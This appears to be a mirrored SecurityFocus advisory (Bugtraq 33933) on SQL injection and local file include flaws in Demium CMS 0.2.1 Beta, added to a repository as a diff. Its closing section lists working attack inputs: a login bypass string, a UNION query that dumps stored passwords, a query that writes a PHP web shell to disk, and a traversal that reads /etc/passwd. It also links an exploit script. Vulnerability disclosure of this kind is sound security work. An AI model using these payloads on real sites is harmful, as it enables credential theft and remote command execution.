@@ -1,0 +1,96 @@
+#SpeeDr00t@Black Falcon<br>#bid33933<p><b><span style="font-size: 18pt;">Demium CMS Multiple Local File Include and SQL Injection Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/33933/info">info</a><br><a href="http://www.securityfocus.com/bid/33933/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/33933/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/33933/solution">solution</a><br><a href="http://www.securityfocus.com/bid/33933/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				33933
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Feb 27 2009 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Feb 27 2009 07:57PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Giovanni Buzzin, Osirys
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Demium Demium CMS 0.2.1 Beta<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x34000/33933/33933.pl">#exploit_33933.pl</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can exploit these issues via a browser.<br/><br/>The following example data is available:<br/><br/>username: admin_user' or '1=1<br/><br/>The following example URIs are available:<br/><br/>http://www.example.com/path/tracking.php?follow_kat=osirys' union select concat(profile_username,0x3a,profile_password) from cms_profile order by '*<br/>http://www.example.com/path/tracking.php?follow_kat=osirys' union select '&amp;lt;?php system($_GETcmd); ?&amp;gt;' into outfile '/tmp/sh_spawn_ownz.txt <br/>http://www.example.com/path/urheber.php?name=../../../../../../../../../../etc/passwd%00<br/><br/>The following exploit code is available:
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/33933.pl">/data/vulnerabilities/exploits/33933.pl</a></li>
+</ul>
+</div>
